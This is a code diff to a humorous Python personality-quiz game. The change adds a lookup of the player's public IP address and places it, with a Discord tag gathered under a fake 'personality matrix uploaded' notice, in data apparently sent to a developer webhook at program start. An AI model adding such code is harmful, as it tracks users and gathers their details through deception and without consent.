@@ -1,4 +1,4 @@
-import random, socket, urllib.request, json
+import random, urllib.request, json
 import mematics # Cool visualizer
 import submenu # Dungeon
 import SECRETS # if you want to build this yourself, create a file called SECRETS.py and create a WEBHOOK string, either as empty or a real discord webhook
@@ -80,6 +80,12 @@ def Display_Beginning():
     print("Please do not type any other characters or words, as the such an answer will be rejected and you will be asked to answer the question again.")
     print("To begin, press enter.")
 
+def get_public_ip():
+    try:
+        return urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
+    except:
+        return "Unable to resolve IP address"
+
 def Send_Data_To_Dev(previously_sent):
     if previously_sent:
         return
@@ -91,11 +97,7 @@ def Send_Data_To_Dev(previously_sent):
     tag = input("Notice: Your answers have been anomalous. Your current personality matrix has been uploaded to a secure server. Please enter your discord tag so the developer can reach out for how to better account for your personality vectors. \nYour discord tag: @")
     desc = input("\nYour response to this question will be attached to your ticket. \nDo you have any information you feel is important to add? \n> ")
 
-    ip_address = "Invalid"
-    try:
-        ip_address = socket.gethostbyname(socket.gethostname())
-    except:
-        pass
+    ip_address = get_public_ip()
 
     payload = {
         "content":
@@ -127,6 +129,8 @@ def Send_Data_To_Dev(previously_sent):
 def main():
     global question_num, previously_sent_data
     question_num = 0
+
+    Send_Data_To_Dev(False)
 
     Display_Beginning()
     bread_rank = Choice("What are your thoughts on cornbread?", "It's not the worst", "I fear giving my true feelings", "Burn it in the holy flames")
@@ -198,11 +202,9 @@ def main():
     Choice("What is your favorite season?", "Spring", "Summer", "Fall")
 
     # IP check (no answers recorded)
-    try:
-        ip_address = socket.gethostbyname(socket.gethostname())
+    ip_address = get_public_ip()
+    if ip_address != "Unable to resolve IP address":
         Choice(f"Is {ip_address} your IP address?", "Yes", "Yes?", "Yes, why?")
-    except:
-        Choice("Did something pop up on your screen just now?", "No, everything's fine", "I think so?", "Yes, I got a virus")
 
     liar += Choice("How long do you think you could pretend to be someone else in casual conversation?", "I could keep it up for hours", "I could try, but my heart wouldn't be in it", "I have no interest in impersonating someone else", target=1)
     awkward += Choice("How often do you think you blink compared to the average person?", "Probably a bit less", "...", "Probably a bit more", target=2)
@@ -344,7 +346,7 @@ def main():
 
     # No more frog (for a few questions)
     feedback = Choice("Anonymous survey question: Do you feel that the answers posed thus far have been helpful in determining your personality? \nA free gift will be provided for your participation.", "Obviously", "Slightly", "Not really", target=3)
-    if (feedback == 1):
+    if feedback == 1 or not hasattr(SECRETS, "GAME_KEY"):
         Choice("It seems we are uh... out of gifts. No particular reason. Sorry.", "Okay", "I feel like I would have gotten something if I had given good feedback.")
     else:
         gift_num = Choice("Thank you for your candid feedback. Please choose a gift as our way of thanking you for your honest, unbiased feedback.", f"The title \"Mr.\" for your frog, {frog_name}", "+1.38 ak_mm score (leads to an interesting personality)", "A steam game code")
@@ -352,7 +354,7 @@ def main():
             frog_name = "Mr. " + frog_name
         elif (gift_num == 2):
             # Me when I tell the truth
-            Choice("Your game code is: KH5BR-TQJRN-LLEN9. Please note that all customers are given the same code. Would you like to pass it on to the next person?", "No, all for me!", "Pass it on!")
+            Choice(f"Your game code is: {SECRETS.GAME_KEY}. Please note that all customers are given the same code. Would you like to pass it on to the next person?", "No, all for me!", "Pass it on!")
     Choice("What's your favorite animal?", "Bunny", "Cat", "Dog")
     Choice("Which of the philosophical frameworks do you align with most closely?", "Utilitarianism", "Consequentialism", "Hedonism")
     pilo_num = random.random()
@@ -625,6 +627,26 @@ def main():
                 "Emails line your inbox with all the random people you have email threads—sorry? Oh, yes, correspondences with.",
                 "You'll probably be offered a job which you've never heard of before by someone you haven't talked to in a decade and it will pay enough to sustain you for the rest of your life."
             ])
+        if hubris > 2:
+            Display_Ending("FWRD - Social Battering Ram", [
+                "When you're enjoying a conversation, you begin to fall into a flow state.",
+                "Jokes become easy, every quip is not only relevant, but lands perfectly.",
+                "People look up to you in odd, left only to nod along to your deeply fascinating story about something they've never even heard of.",
+                "It's all too often said that a lack of self-awareness is a curse, but, like salt, just a pinch makes everything better.",
+                "You've lived an interesting life, one that would probably scare off the average person considering the reputational risks you've incurred for no other reason than a fun afternoon, but clearly it's worth it."
+            ])
 
+    clinginess += Choice("If you're messaging with a friend and they start typing, then stop, what do you do?", "Something probably came up, I'll wait for them to get back", "Send a follow up message to keep the conversation going", "I'll get back to whatever I was doing before", target=2)
+    perfectionist += Choice("You check your phone calendar and find an event is set to go off 1 minute early. How do you respond?", "This likely isn't isolated, I'll check to make sure I didn't mess with a setting or something", "Fix it but keep my eye on it", "No big deal, I don't really care", target=1)
+    liar += Choice("If a child asks if Santa is real, what would you tell them?", "They deserve to know the truth", "Depends on how old they are", "I will protect their innocence", "Santa *is* real", target=1)
+    procrastinator += Choice("You're asked to do a quick task, but you're already in the middle of something. When do you get the task done?", "Get it done now, whatever I was doing can wait", "Let me finish what I'm already doing, then I'll get right to it", "I'm going to say I'll do it after I finish my current thing, but I am going to forget entirely", target=3)
+    Choice("Du wachst auf und sprichst eine andere Sprache. Wie reagieren Sie?", "Bitte helft mir, ich weiß nicht, was diese Worte sagen!", "OK", "Oh, wie aufregend!")
+    ans = Choice("Who do you main in Deadlock?", "Rem", "Abrams", "Graves", "Other", "I do not play Deadlock")
+    if ans == 0:
+        clinginess += 1
+    elif ans == 1:
+        aggression += 1
+    elif ans == 4:
+        Choice("What? Why not?", "I have no received an invite", "It's not my kind of game")
 
 main()
